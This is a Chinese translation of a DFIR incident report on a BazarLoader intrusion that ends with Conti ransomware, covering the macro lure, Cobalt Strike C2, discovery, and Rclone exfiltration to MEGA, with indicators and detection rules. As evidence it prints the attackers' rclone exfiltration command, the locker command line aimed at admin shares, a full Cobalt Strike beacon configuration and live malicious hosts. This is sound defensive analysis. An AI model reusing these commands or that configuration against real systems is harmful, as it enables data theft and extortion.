**译者：知道创宇404实验室翻译组  
原文链接：<https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/>**

在本报告中，我们将讨论8月初的一个案例，在这个案例中，我们发现攻击者利用 BazarLoader 和 Cobalt Strike 并使用 Conti
勒索软件加密系统。

该案例中使用了常规的发现工具列表，如 AdFind、 Net、 Ping、 PowerView 和 Nltest。利用 Rclone 技术将公司数据转移给
Mega，利用 Process Hacker 技术转移 LSASS。攻击者在服务器上执行一个 Conti 批处理文件，然后服务器对大部分域加密。

## 摘要

八月份，我们发现了一起由BazarLoader 感染开始的入侵事件。传递来源可能是一场网络钓鱼运动，该运动向受害者分发有密码保护的 zip
文件和改装化文件。word文档中的宏提取并执行了恶意的.HTA文档，该文档下载并加载了内存中的BazarLoader DLL。

对信息安全界有一个认知是很明显的，即从BazarLoader开始的入侵常常以Conti勒索软件结束。本次事件也得出了这样的结论。在涉及Conti勒索软件的事件中有一些明显的相似之处。勒索软件操作者的工具和执行的总体目的在整个集群中趋于匹配。当我们看我们之前的[Conti
事件](https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks)，这一点变得显而易见。这可能是由于一家分支机构泄露的[Conti手册](https://therecord.media/disgruntled-ransomware-affiliate-leaks-the-conti-gangs-technical-manuals/)广泛传播。在本例中，我们看到了相同的事件模式，工具包括net、nltest、用于discovery的ShareFinder、用于C2的Cobalt
Strike 和WMIC远程进程创建，以便扩展其在网络中的访问。

尽管入侵总共持续了五天，但就在入侵的头两个小时，Cobalt
Strike和键盘操作者出现了。他们立即开始收集信息，使用网络命令了解情形。然后，他们继续通过执行PowerView模块`Invoke-ShareFinder`来查找打开的共享。

在收集和分析ShareFinder的结果后，他们似乎对组织的服务器和工作站布局有了很好的了解，因为他们开始执行命令从特定的高价值服务器收集信息。在此期间，当执行者未能更改特定参数时，我们发现了错误，这些参数说明执行者根据预定义的playbook进行操作。他们最终决定使用WMIC横向转向服务器以执行DLL。

一旦他们通过Cobalt Strike信标访问了远程服务器，他们就会重新运行Invoke ShareFinder，然后通过[MEGA cloud
storage service](https://mega.io/)使用Rclone应用程序从不同的服务器中过滤出有价值的数据.
第二天，攻击者使用RDP访问备份服务器，并在访问过程中通过`taskmanager GUI`查看备份设置和运行服务器上的进程。
第四天，攻击者再次使用Rclone和MEGA进行另一轮过滤。
第五天，他们迅速向最终目标迈进，那就是Conti勒索软件。在执行Conti之前，他们使用RDP安装和配置AnyDesk远程桌面应用程序。由于具有GUI访问权限，他们试图使用ProcessHacker投放LSASS进程。在这最后一步之后，他们通过批处理脚本将Conti勒索软件部署到所有加入域的系统中。

关于这个事件的一个有趣的事情是，我们没有发现攻击者与域控制器（DC）交互。但一般来说，大多数勒索软件事件都涉及到攻击者在DCs上执行代码。

## 时间线

![img](https://images.seebug.org/content/images/2021/12/01/1638341320000-1ytruq.png-w331s)

由 [@Kostastsale](https://twitter.com/Kostastsale),
[@pigerlin](https://twitter.com/pigerlin), and
[@_pete_0](https://twitter.com/_pete_0) 完成分析和报告，由@TheDFIRReport 进行审查。

## MITRE ATT&CK

### 初始访问

感谢 [@James_inthe_box](https://twitter.com/James_inthe_box) 提供样本。

![image-20211130172047743](https://images.seebug.org/content/images/2021/12/01/1638341321000-image-20211130172047743.png-w331s)

与以前记录的入侵一样，攻击者使用内嵌的Microsoft Word文档引诱用户启用宏来执行有效负载。用户会看到以下信息：

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341321000-3lculj.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/f22784bc5813874c131d0c6f21acb3404084de7b57c0ae1f2afde6d8fe24c3a2)

查看文件时，我们可以看到标记为.doc文件的文件类型在查看文件属性时显示为XML。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341321000-4bmqns.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/48fd9c86e04ef1a61d214e6e64ef7c41e6bd9a14221fa1d46971fef9324d2af8)

更深入的检查显示Word 2003 XML格式和包含的宏。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341322000-5dtrxy.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/378c5988f8fc4afa0a81cabf543a41f1e299b701f952ad4077406bd2b7110731)

启用宏后，在下一阶段，将创建一个HTML应用程序（HTA）文件并将其放入用户文件夹：

对HTA文件的分析显示了编码HTML和JavaScript/VBScript代码的混合，更不用说文件开头的亵渎了。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341323000-6ocehw.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/b7eb0f03b4298506d506b3212d1bcc69972e2706249a5b9e535f6ea28d43a323)

随后执行HTA：

[![img](https://images.seebug.org/content/images/2021/12/01/1638341323000-7gwmhb.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/2de12905c5c982b4ae7876ef23c5594051efc03fb0bf0daaad84f480f773830c-1.png)

对HTA文件的分析显示了编码HTML和JavaScript/VBScript代码的混合。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341324000-8jblil.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/9c60564c3c931ab0997a0b1d1576ca09d0ddec29b331655cbcf13c77fb8a5f5a)

base64编码字符串可以解码为：

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341324000-9emvzt.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/9f647bdcc95ed17b46e7e166bd80c79c85701cc53d2c98873bec3a897ce304f6)

代码将伪装成jpg的二进制文件（compareFor.jpg）从`millscruelg[.]com`下载到文件夹“c:\users\public”，并结合VBScript代码，利用REGSVR32执行此DLL。

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341325000-10yhsqf.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/beaa83c86c77ad8f3fe2ad4baa905b35933b1294af9f5631e80e60aafef312b3)

* * *

这将启动与`64.227.65[.]60:443`的连接，并调用`Svchost.exe`，然后查找`myexternalip[.]com`以检索网络的外部面向公众的IPv4地址。攻击者可以使用此信息验证目标网络和加强工具配置。通过RunDll32并使用Svchost进程加载了两个DLL。第一个是D574.dll：

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341325000-11yjajg.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/2de12905c5c982b4ae7876ef23c5594051efc03fb0bf0daaad84f480f773830c)

* * *

之后是 D8B3.dll:

![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341326000-12xbisz.png-w331s)

D8B3.dll注入Winlogon进程（高完整性）：

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341326000-13nncem.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/157ab4613bc64d45aad39a06f7c9e1bbdac31afe3e1da5845f4e4dee593e2c11)

在D8B3.dll中，dll被编译。

这两个DLL都有无效证书，可以以任何失败/已吊销状态被检测到：

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341326000-14mjwqb.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/44cd52c302739e02de041a7db50bc820f0d9b8bc8c948432f55a151e8935e618)

此外，每个DLL都没有与DLL相关的填充元数据：

![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341327000-15unyzk.png-w331s)

进程层次结构树图如下所示：

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341327000-16dbxgv.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/927a09d2bb51e93a6abf163e97fbedc1cf09f76f333ec1a7e5a936345fffc8a5)

这与8月11日布拉德·邓肯对Bazarloader的[分析](https://isc.sans.edu/diary/rss/27738)非常相似。

### 持久性

我们发现在文件夹c:\users\\Videos下创建了AnyDesk应用程序，对于进程活动来说，这个位置是异常且可疑的。因为可移植可执行文件出现在非标准文件系统位置，这也方便了我们检测。

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341328000-17cndsk.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/7f72bf852b58de31e886393160e0dc14665c86c9863f90ac3b69bccc801d18cb)

* * *

[AnyDesk](https://anydesk.com/)是一个封闭源代码的远程桌面应用程序，可用于多种操作系统。它是免费供私人使用的。我们发现了AnyDesk应用程序向合法注册的IPv4范围发起的长连接。然而，在这些环节中，我们没有太有价值的发现。

### 凭证访问

ProcessHacker也被放在C:\的根目录中，可能用于访问LSASS进程。对于用户来说，他们并不常常使用ProcessHacker之类的实用程序，位于C:\root的应用程序在某些环境中也是可疑的。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341328000-18xsjcg.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/ae2d915c25b3741d2639c30c2c10417bf81fcadfdc2c417ba004a8ae6bc64b6e)

### 发现

通过使用RunDLL32和Winlogon进程，我们发现了许多典型的主机和网络发现命令，这些命令使用了net, nltest, tasklist and
time等技术。例子包括：

    
    
    tasklist /s <REDACTED>
    net group "domain admins" /dom
    net localgroup "administrator"
    nltest /domain_trusts /all_trusts
    net view /all /domain
    net view /all time
    ping

在运行其中一些命令时，出现了复制粘贴错误，表明操作者可能从运行手册上操作的，如8月份泄漏的Conti手册一样，在出现错误之后，可以通过 tasklist/s
IP 而不是实际的主机系统 IP 看到。

[![img](https://images.seebug.org/content/images/2021/12/01/1638341328000-19pomdv.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/5794-7.png)

Cmd.exe进程使用不常见的父进程(如 RunDLL32.exe)调用了许多命令。

下面的例子使用 time 命令:

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341329000-20odwmy.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/b9c5ab4ca577c810f6fe15373ae4a2bcc3a79e790a788e0aaa44945ba1c5d6f1)

* * *

Red Canary为 rundll32提供了一个很好的检测指南; [本文](https://redcanary.com/threat-detection-report/techniques/RunDLL32/文档)涵盖了 rundll32的活动，例如命令减少、不寻常的繁殖活动等。

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341329000-21bacbs.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/4cf94e23abd22fa0ad6e718ca833baa0e0b530494c3309acc5d001bda83bdbaa)

* * *

发现命令调用：

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341330000-22lcapg.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/0279e95c4c33e2b33b3509e07e19811588d32c0488908f01d7c006cd0d963e03)

[AdFind](https://thedfirreport.com/2020/05/08/adfind-recon/)
通过二进制文件写入，但还没有发现执行的迹象。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341330000-23smlfd.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/e2869d1ae419f425ffa968640aab1a4db4e893e835136118f2a868727d5b2ee5)

文件共享枚举是使用PowerShell [Invoke-ShareFinder](https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1)
脚本（PowerView的一部分）实现的。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341331000-24coioy.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/5e2b9072978174209ec9599d77e24814eb667a9a475a04d303a32627a73ad5b3)

输出文件是在`c:\ProgramData\found\u
shares.txt`创建的。在最近的其他[入侵](https://thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/)中也观察到了该工具的使用。PowerShell由WinLogon进程调用，结果文件由Rundll32.exe创建。

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341331000-25lxtke.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/93ddd3e8229d05f00c11963ef5f11182f696d3d2907be284d0cbba1d30d62b5d)

* * *

在入侵的第二天，攻击者通过RDP和Cobalt Strike信标访问备份服务器，并打开其服务器上的备份控制台。

[![img](https://images.seebug.org/content/images/2021/12/01/1638341331000-26dyojq.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/5794-8.png)

查看备份后，他们还通过GUI打开taskmanager（[由流程命令行中的/4指示](https://www.hexacorn.com/blog/2018/07/22/taskmgr-exe-slashing-numbers/))查看系统上正在运行的进程。

[![img](https://images.seebug.org/content/images/2021/12/01/1638341332000-27pokvp.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/5794-9.png)

### 横向运动

攻击者在网络中的关键资产（此次入侵中的备份主机）上执行Cobalt Strike信标，使用以下命令 ：

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341332000-28fejsx.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/360da830c3f3842301f7b01e444953cbfc7c457d21206b1b712c8dda08094c72)

* * *

通过 WMI 调用 rundll32在目标主机上加载143.dll (Cobalt Strike 信标)实现远程进程执行:

![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341333000-29abqre.png-w331s)

The Cobalt Strike 信标 (143.dll) 注入到svchost进程`‘svchost.exe -k UnistackSvcGroup
-s CDPUserSvc’`:

* * *

[![img](https://images.seebug.org/content/images/2021/12/01/1638341333000-30myxvl.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/a38f6e90769a77efb1025677dae290858a96d298e805dec77d49d4b3660fdddf.png)

* * *

然后请求`checkauj[.]com (82.117.252.143)`。大约9小时后，攻击者通过143.dll 建立了 RDP
会话。这是在入侵之前实现的，我们将这些行为联系起来:

* * *

![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341333000-31gfbbk.png-w331s)

* * *

在这一事件中，我们认为攻击者泄露了远程工作站的名称“`win-344vu98d3ru`”。

[![img](https://images.seebug.org/content/images/2021/12/01/1638341333000-32sojgy.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/2d929ab92d2873804c44b155f95bc9470fa15dedb84788f9a84d94b86d62e8c3.png)

### 命令和控制

伪装成 jpg 的 Bazar DLL 在整个入侵过程中都使用了 HTTPS C2。

#### Bazar C2

64.227.65.60:4439

    
    
    JA3:72a589da586844d7f0818ce684948eea
    JA3s:ec74a5c51106f0419184d0dd08fb05bc
    Certificate: [7f:d6:df:4d:5e:c4:d9:71:c0:46:8d:47:e5:81:75:57:d6:92:72:96 ]
    Not Before: 2021/08/03 07:37:28 UTC 
    Not After: 2022/08/03 07:37:28 UTC 
    Issuer Org: GG EST 
    Subject Common: perdefue.fr 
    Subject Org: GG EST 
    Public Algorithm: rsaEncryption

161.35.147.110:443

    
    
    JA3:72a589da586844d7f0818ce684948eea
    JA3s:ec74a5c51106f0419184d0dd08fb05bc
    Certificate: [21:ff:9f:e0:8a:dd:c3:ed:36:90:a0:e1:11:70:fe:c4:b3:42:f5:1a ]
    Not Before: 2021/08/03 07:37:30 UTC 
    Not After: 2022/08/03 07:37:30 UTC 
    Issuer Org: GG EST 
    Subject Common: perdefue.fr 
    Subject Org: GG EST 
    Public Algorithm: rsaEncryption

161.35.155.92:443

    
    
    JA3:72a589da586844d7f0818ce684948eea
    JA3s:ec74a5c51106f0419184d0dd08fb05bc
    Certificate: [42:7d:a4:48:5b:6b:2b:92:2c:07:9d:cc:59:14:2e:de:b1:e8:f5:bb ]
    Not Before: 2021/08/03 07:37:30 UTC 
    Not After: 2022/08/03 07:37:30 UTC 
    Issuer Org: GG EST 
    Subject Common: perdefue.fr 
    Subject Org: GG EST 
    Public Algorithm: rsaEncryption

64.227.69.92:443

    
    
    JA3:72a589da586844d7f0818ce684948eea
    JA3s:ec74a5c51106f0419184d0dd08fb05bc
    Certificate: [97:33:eb:80:85:ae:f0:0e:40:94:ac:d5:38:96:6a:e5:75:2b:49:8c ]
    Not Before: 2021/08/03 07:37:28 UTC 
    Not After: 2022/08/03 07:37:28 UTC 
    Issuer Org: GG EST 
    Subject Common: perdefue.fr 
    Subject Org: GG EST 
    Public Algorithm: rsaEncryption

#### Cobalt Strike

第一个 DLL [ D574.DLL ]没有进行任何立即的后续活动，而 D8B3.dll 由
rundll32加载，并参与许多攻击活动，从文件创建、进程执行到与82.117.252[.]143:443持久网络连接，整个入侵过程都有它的身影。

D574.dll 由 rundll32进程加载，具有对 `volga.azureedge [ . ] net`的持久 DNS 查询行为，但没有建立网络连接。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341334000-33asccq.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/a6abc9f9fa1754b78f352dba2d215682604beb1cb1dade806822f3b500194cb6)

我们发现，DLL 有效负载“ d574.DLL”通过[ DNS
9003响应代码](https://blog.didierstevens.com/2021/07/16/sysmons-DNS-querystatus-field/)与域 `volga.azureedge [ . ]`和 c2服务器建立联系。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341334000-34deszl.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/2ed4b6f441190247999fd96b464d551eaae088873bc9c8bbe2ad753b20304711)

外部沙盒显示，该域绑定到其他Cobalt Strike信标样本，但那些样本与此报告没有关联，它很可能是这次服务器已经取消了。

https://tria.ge/210803-w15fxk72ns

https://capesandbox.com/analysis/175977/

D8B3.dll 显示了初始活动，然后是已建立的与82.117.252[ . ]143:80的网络连接。

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341335000-35tyuvf.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/e9d99ea9abdb897fa3d346534f32338e3a5433eeb1e3c2675b208f1e1494b0ed)

D8B3.dll 是攻击者在整个入侵过程中使用的 Cobalt Strike
信标。它作为主要的有效载荷，有利于大部分初始入侵和正在进行的维护访问行为。用于从滩头主机横向移动到备份服务器的 DLL 143.DLL 也与这个
Cobalt Strike 服务器通信。一旦攻击者获得了一个立足点并横向移动，他们就能够使用 RDP 并访问有价值的特定主机。

  * five.azureedge.net 82.117.252.143:80

  * checkauj.com 82.117.252.143:443

    
    
    JA3: a0e9f5d64349fb13191bc781f81f42e1
    JA3s: ae4edc6faf64d08308082ad26be60767
    Certificate: [68:c5:fc:c0:4a:34:e4:8f:01:86:59:c1:da:40:78:00:00:20:a0:b0 ]
    Not Before: 2021/08/03 11:50:47 UTC 
    Not After: 2021/11/01 11:50:45 UTC 
    Issuer Org: Let's Encrypt 
    Subject Common: checkauj.com [checkauj.com ,www.checkauj.com ]
    Public Algorithmrsa:Encryption

#### Cobalt Strike 配置

82.117.252.143 – checkauj.com

    
    
    {
        "BeaconType": [
            "HTTP"
        ],
        "Port": 80,
        "SleepTime": 60000,
        "MaxGetSize": 1403644,
        "Jitter": 37,
        "C2Server": "checkauj.com,/jquery-3.3.1.min.js",
        "HttpPostUri": "/jquery-3.3.2.min.js",
        "Malleable_C2_Instructions": [
            "Remove 1522 bytes from the end",
            "Remove 84 bytes from the beginning",
            "Remove 3931 bytes from the beginning",
            "Base64 URL-safe decode",
            "XOR mask w/ random key"
        ],
        "SpawnTo": "AAAAAAAAAAAAAAAAAAAAAA==",
        "HttpGet_Verb": "GET",
        "HttpPost_Verb": "POST",
        "HttpPostChunk": 0,
        "Spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
        "Spawnto_x64": "%windir%\\sysnative\\rundll32.exe",
        "CryptoScheme": 0,
        "Proxy_Behavior": "Use IE settings",
        "Watermark": 0,
        "bStageCleanup": "True",
        "bCFGCaution": "False",
        "KillDate": 0,
        "bProcInject_StartRWX": "True",
        "bProcInject_UseRWX": "False",
        "bProcInject_MinAllocSize": 17500,
        "ProcInject_PrependAppend_x86": [
            "kJA=",
            "Empty"
        ],
        "ProcInject_PrependAppend_x64": [
            "kJA=",
            "Empty"
        ],
        "ProcInject_Execute": [
            "CreateThread",
            "SetThreadContext",
            "CreateRemoteThread",
            "RtlCreateUserThread"
        ],
        "ProcInject_AllocationMethod": "VirtualAllocEx",
        "bUsesCookies": "True",
        "HostHeader": ""}

### 渗出

一旦攻击者建立了对关键资产的访问权限，他们就使用 RClone 将敏感数据转移到一个名为[ MEGA
](https://MEGA.io/)的云存储空间。Rclone 使用的完整命令包括各种参数，包括设置带宽限制。

    
    
    rclone.exe  copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M

RClone 仍然是大容量数据外泄的常用且有效的工具。NCC 集团已经提供了一份关于 Rclone
应用和检测方法的详细[报道](https://research.nccgroup.com/2021/05/27/detecting-Rclone-an-effective-tool-for-exfiltration/)。

在两个独立的事件中都发现了 Rclone 的存在，每次持续约三小时。

[![img](https://images.seebug.org/content/images/2021/12/01/1638341335000-36zwfyp.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/509f3eb0a90b9b0912db53aa28219919244632a50c04e3d810a0acf874db241d.png)

* * *

### 影响

在第五天，攻击者采取他们的最终行动——加密域。他们首先通过一个交互式命令 shell 在网络上对系统进行 ping。在这个阶段， [Iobit
unlocker](https://www.iobit.com/en/iobit-unlocker.php)也被植入了，但是它没有被使用。在 ping
了系统之后，攻击者打开了一个批处理文件，这个文件最终被用来启动 Conti 勒索软件。

[![img](https://images.seebug.org/content/images/2021/12/01/1638341335000-37eydrg.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/f3a3a919075ac160b8b18838ec9cef851eafe21ccb08c306f068ef7b0f6dead3.png)

locker.bat是一个定制的脚本，用于在多个主机上对文件进行加密:

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341336000-38bkcix.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/7b9e7c4d301dcb9922a9995615a03d6cbea55c1a141d820f909f68fd95414d96)

* * *

根据文件的内容，我们有理由认为攻击者可能在得到ping 结果后，在执勒索软件之前做了最后的调整。

然后通过备份服务器发射勒索软件。

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341336000-39icqhe.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/9cc86be7737f8d74a5bfd4da00fb46d2c3d899ebdc0475dccb0792932e3d1235)

* * *

为了加密系统，勒索软件为每个目标主机安装了 C$dir，然后执行其加密例程。

    
    
    C:\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe -m -net -size 10 -nomutex -p \\TARGETHOST\C$

以下是执行过程的概述:

![img](https://images.seebug.org/content/images/2021/12/01/1638341337000-40zehjq.png-w331s)

对DLL和指示Conti工件的EXE的分析：

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341337000-41qyjxt.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/501735cefb3cc7d0b08f983c8a57b193267d9d1f2d49b9809e333aa15e4abd9b)

* * *

加密完成后，以下勒索软件注释将作为“readme.txt”放在所有受影响的目录中

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341338000-42dtgja.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/145eb3e900a27ad1bb6ebc7ba77c7ef2da278e0aa28ac69b0a995caad10ade27)

* * *

这些text文件的内容：

* * *

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341338000-43apwot.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/ecaecfdb88f5ae8a174538af1ada8f5235a885544520ee0c01905f1e861b3310)

* * *

在执行locker勒索软件后，攻击者随后针对多台主机执行了一个文件列表发现，似乎是在验证和评估locker加密是否成功：

[![enter image description
here](https://images.seebug.org/content/images/2021/12/01/1638341339000-44oxxkl.png-w331s)](https://thedfirreport.com/wp-content/uploads/2021/11/6cd18842629e69c9e3ce73f5af6192b42e43492f72dee865acb7c5c2077f0a37)

## IOCs

### Network

BazarLoader 64.227.69.92|443 161.35.155.92|443 161.35.147.110|443
64.227.65.60|443

Loader download
millscruelg.com([ZoomEye搜索结果](https://www.zoomeye.org/searchResult?q=millscruelg.com))
45.95.11.133|80

Cobalt Strike volga.azureedge.net five.azureedge.net checkauj.com
82.117.252.143|443 82.117.252.143|80

### Files

    
    
    decree-08.03.2021.doc
    f6f72e3d91f7b53dd75e347889a793da
    5d4f020115a483e9e5aa9778c038466f9014c90c
    14bccfecaaec8353e3e8f090ec1d3e9c87eb8ceb2a7abedfc47c3c980da8ad71
    compareForFor.hta
    193b84d45dd371c6e4a501333d37349b
    742ed8d0202aafba1c162537087a8a131cb85cde
    fb38061bf601001c45aafe8d0c5feaa22c607d2ff79cfb841788519ca55a17b4
    D8B3.dll
    4ba6791f2293a8bc2dfa537015829b3c
    d4f5cc55b6fa25f9a45ba7e968438b97e33aefbc
    4a49cf7539f9fd5cc066dc493bf16598a38a75f7b656224db1ddd33005ad76f6
    D574.dll
    663c8d0fe8b770b50792d10f6c07a652
    d0361fbcebe59205b2ea6a31041c89464a5e61b6
    1872bf6c974e9b11040851f7d30e5326afdc8b13802891c222af4368a14f829c
    143.dll
    ab3a744545a12ba2f6789e94b789666a
    1d5f8d283ed3f6019954aa480182c9913ee49735
    6f844a6e903aa8e305e88ac0f60328c184f71a4bfbe93124981d6a4308b14610
    ProcessHacker.exe
    68f9b52895f4d34e74112f3129b3b00d
    c5e2018bf7c0f314fed4fd7fe7e69fa2e648359e
    d4a0fe56316a2c45b9ba9ac1005363309a3edc7acf9e4df64d326a0ff273e80f
    locker.bat
    84361813423910294079d0bc5b6daba2
    c0b28fd2d5b62d5129225e8c45d368bc9e9fd415
    1edfae602f195d53b63707fe117e9c47e1925722533be43909a5d594e1ef63d3
    o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe
    7f112bfa16a6bd344aaed28abf606780
    eaa792a1c9f1d277af3d88bd9ea17a33275308f3
    9cd3c0cff6f3ecb31c7d6bc531395ccfd374bcd257c3c463ac528703ae2b0219
    o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x64.dll
    2c313c5b532c905eb8f1748a0d656ff9
    70725329e4c14b39d49db349f3c84e055c111f2d
    31656dcea4da01879e80dff59a1af60ca09c951fe5fc7e291be611c4eadd932a
    o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x86.dll
    26bd89afd5c1ba9803422d33185cef89
    c99f0fa8d5fbffe5288aaff84dbe980c412ba34e
    01a9549c015cfcbff4a830cea7df6386dc5474fd433f15a6944b834551a2b4c9
    AnyDesk.exe
    e6c3ab2ee9a613efdf995043b140fd8e
    33738cf695a6ac03675fe925d62ecb529ac73d03
    8f09c538fc587b882eecd9cfb869c363581c2c646d8c32a2f7c1ff3763dcb4e7
    unlocker.exe
    5840aa36b70b7c03c25e5e1266c5835b
    ea031940b2120551a6abbe125eb0536b9e4f14c8
    09d7fcbf95e66b242ff5d7bc76e4d2c912462c8c344cb2b90070a38d27aaef53
    rclone.exe
    9066cfcf809bb19091509a4d0f15f092
    f88a948b0fd137d4b14cf5aec0c08066cb07e08d
    9b5d1f6a94ce122671a5956b2016e879428c74964174739b68397b6384f6ee8b

### Suricata

    
    
    ET TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile Response
    ETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2
    ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) 
    ET USER_AGENTS AnyDesk Remote Desktop Software User-Agent 
    ET POLICY HTTP POST to MEGA Userstorage 

### Sigma

    
    
    rclone_execution.yaml 
    sysmon_in_memory_powershell.yml 
    win_susp_wmic_proc_create_rundll32.yml 
    sysmon_abusing_debug_privilege.yml 
    win_trust_discovery.yml
    win_office_shell.yml
    win_mshta_spawn_shell.yml 
    win_susp_net_execution.yml
    win_susp_regsvr32_anomalies.yml
    sysmon_rundll32_net_connections.yml
    win_net_enum.yml
    win_susp_wmi_execution.yml

### Yara

    
    
    /*
       YARA Rule Set
       Author: TheDFIRReport
       Date: 2021-11-29
       Identifier: 5794
       */
    
    /* Rule Set ----------------------------------------------------------------- */
    
    rule mal_host2_143 {
       meta:
          description = "mal - file 143.dll"
          author = "TheDFIRReport"
          date = "2021-11-29"
          hash1 = "6f844a6e903aa8e305e88ac0f60328c184f71a4bfbe93124981d6a4308b14610"
       strings:
          $x1 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii
          $x2 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii
          $x3 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii
          $x4 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii
          $x5 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFileabi mismatchadvapi32" ascii
          $x6 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii
          $x7 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing= ms clock" ascii
          $x8 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii
          $x9 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii
          $x10 = "Ptrmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexlocked m0 woke upmark - bad statusmarkBits overf" ascii
          $x11 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii
